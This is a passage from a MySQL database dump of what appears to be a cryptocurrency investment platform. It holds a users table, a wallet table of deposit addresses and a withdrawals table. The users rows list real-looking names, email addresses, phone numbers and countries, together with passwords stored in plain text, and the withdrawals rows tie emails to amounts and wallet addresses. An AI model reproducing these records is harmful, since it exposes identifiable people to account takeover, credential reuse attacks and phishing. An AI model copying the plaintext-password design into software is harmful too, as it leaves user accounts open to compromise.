kumar','Kundanjee564@gmail.com','9576722576','--','Abcd@1234','India','0','0','0',0,0,0,0,0,0,'no','no','','1355153502','Investor23','2024-08-18 20:52:38','0',0,'0','null'),(40,'Mamazane ','Tshabalala ','mamazanetshabalala29@gmail.com','0634808962','--','@Zane2580','South Africa','0','0','0',0,0,0,0,0,0,'no','no','','1569573258','Investor087','2024-08-19 16:52:37','0',0,'0','null'),(41,'Nhleks3','Nonhlanhla Makama ','sandramakama307@gmail.coms','+26876110115','--','reFlex12','Swaziland','0','0','0',0,0,0,0,0,0,'no','no','','1656088383','Investor087','2024-08-21 12:10:46','0',0,'0','null'),(42,'niphos','Sandra N. Makama ','sandramakama307@gmail.com','+26879814034','--','niphOsIm64','Swaziland','0','0','0',0,0,0,0,0,0,'no','no','','296776953','Investor087','2024-08-21 12:28:11','0',0,'0','approved'),(43,'Samuel ','Samuel peppe','Cemjessica@gmail.com','11111111111','--','bukkybukky','United Kingdom','0','0','0',0,0,0,0,0,0,'no','no','','1409585339','','2024-08-22 18:53:07','0',0,'0','null'),(44,'@diegho2410','Juan Diego ','juandieghoc7@gmail.com','+584120982916','--','JuanCe2410','Venezuela','0','0','0',0,0,0,0,0,0,'no','no','','725526060','Samuel','2024-08-22 21:10:20','0',0,'0','null'),(45,'@marcedmonds','Hillary Hwenje','hwenje1978@gmail.com','+263715339664','--','Angelfaith@7','Zimbabwe','0','0','0',0,0,0,0,0,0,'no','no','','1112368993','','2024-08-22 23:08:24','0',0,'0','null'),(46,'Cryptonite ','Dennison brain ','davidbukky11@gmail.com','11111111111','--','bukkybukky','United Kingdom','0','0','0',0,0,0,0,0,0,'no','no','','482487953','','2024-08-24 09:11:05','0',0,'0','null'),(47,'Cryptonite ','Johnson Fredrick ','hannumkellie99@gmail.com','11111111111','--','bukkybukky','United Kingdom','17400','0','15000',0,2000,0,0,0,0,'no','no','','867304239','','2024-08-24 09:16:44','0',0,'0','approved'),(48,'Cryptostar ','Cryptostar','olichristopher4@gmail.com','11111111111','--','bukkybukky','United Kingdom','3437','0','17259',0,16000,0,0,0,0,'no','no','','834990503','','2024-08-24 09:32:18','1',0,'0','approved'),(49,'Bonaf27 ','AUOCOS FRANÇOIS BORGIA','leaderafb2023@gmail.com','+229 44994808','--','Bonaf2@22','Benin','0','0','0',0,0,0,0,0,0,'no','no','','2041700714','','2024-08-24 22:22:03','0',0,'0','null'),(50,'Alexio ','Katamiha ','Katamihaalexio@gmail.com','+263783926695','--','Badmanxool88!','Zimbabwe','0','0','0',0,0,0,0,0,0,'no','no','','98924996','','2024-08-26 16:22:58','0',0,'0','null'),(51,'Sipho24','Siphosethu Mpofu','mpofusiphosethu54@gmail.com','263775461653','--','Kasilo52.56@!','Zimbabwe','0','0','0',0,0,0,0,0,0,'no','no','','86933461','Investor087','2024-08-27 12:38:22','0',0,'0','null'),(52,'Paterne','Paterne IHIMBAZWE ','ihimbazwepatty2019@gmail.com','+250785183948','--','Paterne@1','Rwanda','2.27','0','154.93',100,0,0,0,0,0,'no','no','','580607096','Investor23','2024-08-28 06:53:14','1',0,'0','null'),(53,'Gupta1166','Gupta ji ','rklifegupta@gmail.com','+919540461166','--','123456789','India','0','0','0',0,0,0,0,0,0,'no','no','','1011103260','Investor087','2024-08-31 10:32:54','0',0,'0','null'),(54,'Charles7','Charles Chinoko ','charlesstephenngulube@gmail.com','+27604781767','--','CharityVincentEdith','Afghanistan','0','0','0',0,0,0,0,0,0,'no','no','','351170209','CRYPTO','2024-09-03 20:53:56','0',0,'0','null'),(55,'JAMMU786','Anchal Kumar ','anchalkumarjunan1145@gmail.com','+919797443214','--','Anchal@143','India','52','0','72.80000000000001',100,0,0,0,0,0,'no','no','','1578739385','Investor087','2024-09-04 04:56:46','1',0,'0','null'),(56,'Olga','Ольга','ol12.olha@yandex.ru','+79183791322','--','zxcZXC123!@#','Russian Federation','0','0','0',0,0,0,0,0,0,'no','no','','911252966','','2024-09-04 07:45:24','0',0,'0','null'),(57,'Edward80','Edward','Fafafafafeeee@gmail.com','+12093966195','--','Kingsley01','Nigeria','0','0','0',0,0,0,0,0,0,'no','no','','1421495224','Investor087','2024-09-05 21:15:14','0',0,'0','null'),(58,'Arti143','Arti devi','aat31012023@gmail.com','9149975808','--','Arti@143','India','0','0','0',0,0,0,0,0,0,'no','no','','1592679274','JAMMU786','2024-09-06 04:57:22','0',0,'0','null'),(59,'Tanish143','Tanish junan','artidevijunan143@gmail.com','9596967465','--','Tanish@143','India','0','0','0',0,0,0,0,0,0,'no','no','','298117498','JAMMU786','2024-09-06 05:01:46','0',0,'0','null'),(60,'Shivanya ','Shivanya ','jssfect20142015@gmail.com','9103610239','--','Shivanya@143','India','0','0','0',0,0,0,0,0,0,'no','no','','72218947','JAMMU786','2024-09-06 05:11:34','0',0,'0','null'),(61,' Surishta143','Surishta Devi','akallbanking4443@gmail.com','9596633879','--','Surishta@143','India','0','0','0',0,0,0,0,0,0,'no','no','','893405351','JAMMU786','2024-09-06 05:27:18','0',0,'0','null'),(62,'Mohan4567','mohan lal','mohanlal88032@gmail.com','9149793254','--','Mohan@123','India','0','0','0',0,0,0,0,0,0,'no','no','','635481054','JAMMU786','2024-09-07 05:05:51','0',0,'0','null'),(63,'Marshall','Daniel Marshall','marshalldaniel2001@gmail.com','09046652323','--','marshall2001','Nigeria','0','0','0',0,0,0,0,0,0,'no','no','','627170022','','2024-09-07 08:12:19','0',0,'0','null'),(64,'STRASON','GEORGE NJOROGE','dynakim65@gmail.com','+254723949223','--','GEAM@RAVEN65Kn','Kenya','0','0','0',0,0,0,0,0,0,'no','no','','88337842','Investor087','2024-09-09 07:10:51','0',0,'0','null'),(65,'KATHUA','Harikrishan ','krishanhari06@gmail.com','7006698743','--','Rupinder@123','India','0','0','0',0,0,0,0,0,0,'no','no','','658771998','JAMMU786','2024-09-10 11:52:48','0',0,'0','null'),(66,'Sanjay1984','Sanjay panchal','sanjay.panchal101984@gmail.com','9772433232','--','Sanjay@1984','India','0','0','0',0,0,0,0,0,0,'no','no','','1740191269','JAMMU786','2024-09-11 12:36:51','0',0,'0','null'),(67,'William','William Ava','williamava1212@gmail.com','1234567890','--','Jay12345','Afghanistan','0','0','0',0,0,0,0,0,0,'no','no','','159357602','','2024-09-12 21:09:38','0',0,'0','null'),(68,'Mohamad','mohamad mahozi','hasanmahmodi206@gmail.com','00449351987188','--','mc761020','Afghanistan','0','0','0',0,0,0,0,0,0,'no','no','','508476988','CRYPTO','2024-09-12 22:32:34','0',0,'0','null'),(69,'JAassociates','Javed Akhter','javed7889985384@gmail.com','7889985384','--','Javed922071','India','0','0','0',0,0,0,0,0,0,'no','no','','2018536177','JAMMU786','2024-09-14 11:51:04','0',0,'0','null'),(70,'Toyiba ','Toyiba','toyibajaved@gmail.com','8899848676','--','Javed922071','India','0','0','0',0,0,0,0,0,0,'no','no','','548994325','JAassociates','2024-09-14 11:56:42','0',0,'0','null'),(71,'Toyiba','Toyiba','aktharjaved735@gmail.com','8899848676','--','Javed922071','India','0','0','0',0,0,0,0,0,0,'no','no','','420459360','JAassociates','2024-09-14 12:00:55','0',0,'0','null'),(72,'Toyiba1','Toyiba','akhtarjaved735@gmail.com','8899848676','--','Javed786','India','0','0','0',0,0,0,0,0,0,'no','no','','1749849493','JAMMU 786','2024-09-14 12:11:47','0',0,'0','null'),(73,'Sultan','Sultan SALAUL din','javed201920@gnail.com','7889880160','--','Javed786','India','0','0','0',0,0,0,0,0,0,'no','no','','1473723310','JAMMU786','2024-09-14 12:15:18','0',0,'0','null'),(74,'Sultan','Sultan SALAUL Din','ToyibaJaved16@gmial.com','8899848676','--','Javed786','India','0','0','0',0,0,0,0,0,0,'no','no','','974397563','JAMMU 786','2024-09-14 12:20:16','0',0,'0','null'),(75,'Sultan','Sultan SALAUL Din','tToyibaJaved@gmail.com','7889880160','--','Javed786','India','0','0','0',0,0,0,0,0,0,'no','no','','1456522699','JAMMU786','2024-09-14 12:26:02','0',0,'0','null'),(76,'Khurshida','Khurshida begum','toyibjaved121@gmail.com','7889880160','--','Javed786','India','0','0','0',0,0,0,0,0,0,'no','no','','761505440','JAMMU786','2024-09-14 12:28:52','0',0,'0','null'),(77,'Zoohra','Zoohra Fathma','Toyibajaved538@gmial.com','8899848676','--','Javed786','India','0','0','0',0,0,0,0,0,0,'no','no','','1930638459','JAMMU786','2024-09-14 12:31:30','0',0,'0','null'),(78,'Nadine amal','Najoua bent taieb hidri','najouapolice2017@gmail.com','21620179218','--','najouapolice2017','Tunisia','0','0','0',0,0,0,0,0,0,'no','no','','621237272','Investor087','2024-09-14 15:36:16','0',0,'0','null'),(79,'Wasim01','Wasim Akhter','Dazzlingsultan1122@gmail.com','7889880160','--','Sult@n1995','India','0','0','0',0,0,0,0,0,0,'no','no','','1019980631','JAassociates','2024-09-15 07:19:16','0',0,'0','null'),(80,'sabinmakungu102@gmail.com','sabin makungu','sabinmakungu102@gmail.com','+243990004487','--','1021984Sabin','Congo, The Democratic Republic of The','0','0','0',0,0,0,0,0,0,'no','no','','773157088','Investor23','2024-09-15 15:48:07','0',0,'0','null'),(81,'Investor22','Hi JJ ghg','nnejivv751@gmail.com','07046519130','--','123456vv','Nigeria','0','0','0',0,0,0,0,0,0,'no','no','','1507828742','','2024-09-15 15:59:57','0',0,'0','null'),(82,'sladjana0 ','sladjana simanic','sladjanasimanic929@gmail.com','00381677159375','--','1Sladjana','Serbia','0','0','0',0,0,0,0,0,0,'no','no','','2090188140','','2024-09-17 15:57:40','0',0,'0','null'),(83,'rave','Lorna Vaz','vazlorna0@gmail.com','4162592729','--','100Nevar??','Canada','0','0','15.600000000000001',100,0,0,0,0,0,'no','no','','1623150732','','2024-09-18 15:13:30','1',0,'0','null'),(84,'CRYPTO C','CRYPTO C','ssamuelfrizzy@gmail.com','07043695334','--','@@@@@12345','New Zealand','0','0','0',0,0,0,0,0,0,'no','no','','337898710','','2024-09-18 21:10:05','0',0,'0','null'),(85,'niclyn','Nicole Gotta','nicmawusegotta@protonmail.com','+233544070486','--','6?Boom@4xv%zjmfvimHJor','Ghana','0','0','0',0,0,0,0,0,0,'no','no','','1202830853','Investor087','2024-09-19 04:01:35','0',0,'0','null'),(86,'John ','Roland ','johnnyrol522@gmail.com','9155940550','--','Avatar','Nigeria','0','0','0',0,0,0,0,0,0,'no','no','','337005367','','2024-09-20 04:05:28','0',0,'0','null'),(87,'Sam ','Reynolds','vickimacky53@gmail.com','80255114825','--','Des123tiny','Afghanistan','0','0','0',0,0,0,0,0,0,'no','no','','1110348141','','2024-09-21 13:10:15','0',0,'0','null');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `wallet`
--

DROP TABLE IF EXISTS `wallet`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `wallet` (
  `id` int NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `wallet_address` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `wallet`
--

LOCK TABLES `wallet` WRITE;
/*!40000 ALTER TABLE `wallet` DISABLE KEYS */;
INSERT INTO `wallet` (`id`, `name`, `wallet_address`) VALUES (1,'BTC','bc1qx0y9q006g7pszjwuy39mypmphzqzw3rey75aty'),(2,'DOGECOIN','DCZTb9pEZwkVnoH8m6tkwLTmJcnpo5QFvj'),(3,'Usdt (Trc20)','TWA3v31joarHNNkb39RBQfKS7fK7Er2Hcg'),(4,'ETHEREUM','0xc63c11a4542352c6E889352b2E39A2CBeb9B2F97'),(5,'BNB','0xc63c11a4542352c6E889352b2E39A2CBeb9B2F97');
/*!40000 ALTER TABLE `wallet` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `withdrawals`
--

DROP TABLE IF EXISTS `withdrawals`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `withdrawals` (
  `id` int NOT NULL AUTO_INCREMENT,
  `user_id` int NOT NULL,
  `email` varchar(255) NOT NULL,
  `from_wallet` varchar(255) NOT NULL,
  `status` int NOT NULL,
  `wallet_addr` varchar(255) NOT NULL,
  `method` varchar(255) NOT NULL,
  `date_withdrawn` varchar(255) NOT NULL,
  `amount` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=37 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `withdrawals`
--

LOCK TABLES `withdrawals` WRITE;
/*!40000 ALTER TABLE `withdrawals` DISABLE KEYS */;
INSERT INTO `withdrawals` (`id`, `user_id`, `email`, `from_wallet`, `status`, `wallet_addr`, `method`, `date_withdrawn`, `amount`) VALUES (1,10,'ozoatuegbusamuelo91@gmail.com','2',0,'Yyģhhuuu','USDT(Trc20)','2024-07-25 22:20:10','300'),(2,10,'ozoatuegbusamuelo91@gmail.com','2',1,'Bhguyuy67ytyyyyyuuuuuii','USDT(Trc20)','2024-07-25 23:06:44','100'),(3,10,'ozoatuegbusamuelo91@gmail.com','1',1,'TD5MbRawgv3VfviELuAn92D9NgyKbWFwgi','Tether Trc20','2024-07-25 23:09:50','100'),(4,7,'spotwebdev.com@gmail.com','2',2,'kjvjgjjgjgjgjgj','BTC(Bitcoin)','2024-07-27 18:03:07','20'),(5,7,'spotwebdev.com@gmail.com','2',1,'jjjjjj','BNB','2024-07-27 18:16:59','50'),(6,10,'ozoatuegbusamuelo91@gmail.com','2',1,'Bhguyuy67ytyyyyyuuuuuii','USDT(Trc20)','2024-07-28 10:50:48','100'),(7,11,'boomybae9@gmail.com','1',1,'Utyy8ttuggy78ihfeewwdyuhihggdww','BNB','2024-08-02 08:48:16','600'),(8,11,'boomybae9@gmail.com','1',1,'Utyy8ttuggy78ihfeewwdyuhihggdww','Tether Trc20','2024-08-02 08:58:41','600'),(9,11,'boomybae9@gmail.com','2',1,'Utyy8ttuggy78ihfeewwdyuhihggdww','USDT(Trc20)','2024-08-02 11:55:30','600'),(10,11,'boomybae9@gmail.com','2',0,'Utyy8ttuggy78ihfeewwdyuhihggdww','USDT(Trc20)','2024-08-02 11:55:44','600'),(11,14,'samuelfrizzysamuelfrizzy148@gmail.com','2',1,'Bhguyuy67ytyyyyyuuuuuii','USDT(Trc20)','2024-08-02 21:17:08','600'),(12,14,'samuelfrizzysamuelfrizzy148@gmail.com','2',0,'Bhguyuy67ytyyyyyuuuuuii','USDT(Trc20)','2024-08-02 21:18:55','600'),(13,14,'samuelfrizzysamuelfrizzy148@gmail.com','2',1,'Bhguyuy67ytyyyyyuuuuuii','USDT(Trc20)','2024-08-02 21:20:13','5000'),(14,14,'samuelfrizzysamuelfrizzy148@gmail.com','2',1,'TD5MbRawgv3VfviELuAn92D9NgyKbWFwgi','USDT(Trc20)','2024-08-02 21:35:36','600'),(15,10,'ozoatuegbusamuelo91@gmail.com','2',2,'Bhguyuy67ytyyyyyuuuuuii','USDT(Trc20)','2024-08-06 17:32:07','100'),(16,10,'ozoatuegbusamuelo91@gmail.com','2',2,'Bhguyuy67ytyyyyyuuuuuii','USDT(Trc20)','2024-08-06 17:32:12','100'),(17,14,'samuelfrizzysamuelfrizzy148@gmail.com','2',1,'TD5MbRawgv3VfviELuAn92D9NgyKbWFwgi','USDT(Trc20)','2024-08-07 12:45:02','600'),(18,11,'boomybae9@gmail.com','1',1,'gaigwkbaowbsnvslanqpqpwjsoshndh','Tether Trc20','2024-08-15 07:55:56','200'),(19,14,'samuelfrizzysamuelfrizzy148@gmail.com','2',1,'TD5MbRawgv3VfviELuAn92D9NgyKbWFwgi','USDT(Trc20)','2024-08-16 07:48:34','3500'),(20,7,'spotwebdev.com@gmail.com','2',1,'0XXdnffjnffnfnfnfnf','Ethereum','2024-08-16 11:53:45','20'),(21,37,'davidbukky11@gmail.com','1',1,'TWXwqcRzMbNDBgG3mL9GMt3SUPmxPLG8YH','Tether Trc20','2024-08-22 22:23:36','600'),(22,47,'hannumkellie99@gmail.com','1',0,'TWXwqcRzMbNDBgG3mL9GMt3SUPmxPLG8YH','Tether Trc20','2024-08-24 09:27:58','600'),(23,48,'olichristopher4@gmail.com','1',0,'TWXwqcRzMbNDBgG3mL9GMt3SUPmxPLG8YH','Tether Trc20','2024-08-24 09:43:27','600'),(24,48,'olichristopher4@gmail.com','1',1,'TWXwqcRzMbNDBgG3mL9GMt3SUPmxPLG8YH','Tether Trc20','2024-08-24 09:43:38','600'),(25,48,'olichristopher4@gmail.com','1',1,'TWXwqcRzMbNDBgG3mL9GMt3SUPmxPLG8YH','Tether Trc20','2024-08-24 09:44:35','15400'),(26,47,'hannumkellie99@gmail.com','1',1,'TWXwqcRzMbNDBgG3mL9GMt3SUPmxPLG8YH','Tether Trc20','2024-08-27 11:17:01','2000'),(27,11,'boomybae9@gmail.com','2',1,'Utyy8ttuggy78ihfeewwdyuhihggdww','USDT(Trc20)','2024-08-28 07:08:11','1000'),(28,11,'boomybae9@gmail.com','2',1,'Utyy8ttuggy78ihfeewwdyuhihggdww','USDT(Trc20)','2024-08-28 10:19:06','900'),(29,14,'samuelfrizzysamuelfrizzy148@gmail.com','2',0,'Bhguyuy67ytyyyyyuuuuuii','USDT(Trc20)','2024-08-30 21:01:11','100'),(30,11,'boomybae9@gmail.com','2',1,'bgjfiifghfgdcvxccvbcxsmuchyvcxfjdcnxxndc c','USDT(Trc20)','2024-08-31 11:28:52','300'),(31,10,'ozoatuegbusamuelo91@gmail.com','2',0,'Bhguyuy67ytyyyyyuuuuuii','USDT(Trc20)','2024-09-12 06:34:22','100'),(32,10,'ozoatuegbusamuelo91@gmail.com','2',0,'Bhguyuy67ytyyyyyuuuuuii','USDT(Trc20)','2024-09-12 06:34:30','100'),(33,7,'spotwebdev.com@gmail.com','2',1,'kjvjgjjgjgjgjgj','USDT(Trc20)','2024-09-13 19:56:32','20'),(34,7,'spotwebdev.com@gmail.com','2',1,'vfffrrrrrrrrrrrrrrrrrrf','Ethereum','2024-09-13 20:03:07','100'),(35,31,'Rokafelr8@gmail.com','1',0,'bc1qenlvxntu4dsfg3w2smkmk7qjtu3k24yrwt8vem','BTC(Bitcoin)','2024-09-16 16:53:30','50'),(36,10,'ozoatuegbusamuelo91@gmail.com','2',2,'Bhguyuy67ytyyyyyuuuuuii','USDT(Trc20)','2024-09-20 07:43:52','100');
/*!40000 ALTER TABLE `withdrawals` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Dumping events for database 'ocjrgyjg_jay'
--

--
-- Dumping routines for database 'ocjrgyjg_jay'
--
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2024-09-30 16:22:12
